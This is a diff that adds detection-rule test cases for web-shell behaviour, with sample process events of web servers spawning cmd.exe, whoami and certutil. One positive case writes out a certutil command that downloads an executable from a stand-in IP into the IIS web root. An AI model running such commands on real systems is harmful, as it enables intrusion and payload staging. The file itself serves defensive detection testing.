@@ -1,0 +1,52 @@
+rule: TH-017-web-shell-behavior
+description: >
+  Positives cover the Windows and Linux web-server parents with each child family. Negatives cover an
+  IIS worker starting a legitimate application binary and a shell with an ordinary interactive parent.
+cases:
+  - name: IIS worker spawning cmd.exe
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c whoami'
+      ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+      User: 'IIS APPPOOL\DefaultAppPool'
+
+  - name: Apache spawning whoami on Linux
+    expect: match
+    event:
+      Image: '/usr/bin/whoami'
+      CommandLine: 'whoami'
+      ParentImage: '/usr/sbin/apache2'
+      User: 'www-data'
+
+  - name: php-cgi running certutil
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.30/s.exe C:\inetpub\wwwroot\s.exe'
+      ParentImage: 'C:\Program Files\PHP\php-cgi.exe'
+      User: 'IIS APPPOOL\Site1'
+
+  - name: IIS worker starting a legitimate application binary
+    expect: no_match
+    event:
+      Image: 'C:\Program Files\Contoso\WebApp\reportgen.exe'
+      CommandLine: 'reportgen.exe --daily'
+      ParentImage: 'C:\Windows\System32\inetsrv\w3wp.exe'
+      User: 'IIS APPPOOL\DefaultAppPool'
+
+  - name: cmd.exe with an ordinary interactive parent
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\cmd.exe'
+      CommandLine: 'cmd.exe /c whoami'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'CONTOSO\jdoe'
+
+  - name: Node process spawning its own worker
+    expect: no_match
+    event:
+      Image: 'C:\Program Files\nodejs\node.exe'
+      CommandLine: 'node.exe worker.js'
+      ParentImage: 'C:\Program Files\nodejs\node.exe'
+      User: 'CONTOSO\svc-node'
